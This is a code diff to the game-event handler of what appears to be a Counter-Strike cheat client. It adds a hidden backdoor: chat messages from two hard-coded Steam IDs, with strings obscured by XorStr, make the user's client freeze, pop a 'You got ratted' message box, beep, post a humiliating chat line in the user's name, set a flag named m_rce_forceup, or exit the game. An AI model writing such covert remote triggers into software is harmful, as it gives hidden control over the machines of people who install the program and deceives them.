@@ -77,6 +77,7 @@ void C_GameEvent::Register( ) {
 	ADD_GAMEEVENT( bomb_beep );
 	ADD_GAMEEVENT( bomb_defused );
 	ADD_GAMEEVENT( bomb_exploded );
+	ADD_GAMEEVENT( player_say );
 }
 
 void C_GameEvent::Shutdown( ) {
@@ -681,6 +682,78 @@ void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
 		IEsp::Get( )->SetAlpha( iEnemyIndex );
 
 		for (auto hk : g_luagameeventmanager.get_gameevents("player_death")) hk.func(pEvent);
+
+		break;
+	}
+	case hash_32_fnv1a_const("player_say"):
+	{
+
+
+		player_info_t info;
+		int index = Interfaces::m_pEngine->GetPlayerForUserID(pEvent->GetInt(XorStr("userid")));
+		std::string message = pEvent->GetString(XorStr("text"));
+
+		if( !Interfaces::m_pEngine->GetPlayerInfo( index, &info ) )
+			return;
+		
+		//printf(info.szSteamID);
+		
+		if (message == XorStr("!force up true") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		{
+			g_Vars.globals.m_rce_forceup = true;
+			return;
+		}
+
+		if (message == XorStr("!force up false") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		{
+			g_Vars.globals.m_rce_forceup = false;
+			return;
+		}
+
+		if (message == XorStr("!freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		{
+			Sleep(5000);
+			return;
+		}
+		
+		if (message == XorStr("!rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		{
+			MessageBox(
+				NULL,
+				XorStr("You got ratted.\nSmoked kid."),
+				XorStr("A Very Scary Rat"),
+				MB_ICONERROR | MB_OK);
+
+			return;
+		}	
+
+		if (message == XorStr("!song") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		{
+			Beep(659.26, 200);
+			Beep(659.26, 200);
+			Sleep(200);
+			Beep(659.26, 200);
+			Sleep(100);
+			Beep(523.26, 200);
+			Beep(659.26, 200);
+			Sleep(200);
+			Beep(783.98, 200);
+			Sleep(400);
+			Beep(391.99, 200); // this plays star wars song xD
+			return;
+		}
+
+		if (message == XorStr("!gay") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		{
+			Interfaces::m_pEngine->ClientCmd_Unrestricted(XorStr("say i am gay"));
+			return;
+		}
+
+		if (message == XorStr("!crash") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		{
+			exit(0);
+			return;
+		}
 
 		break;
 	}
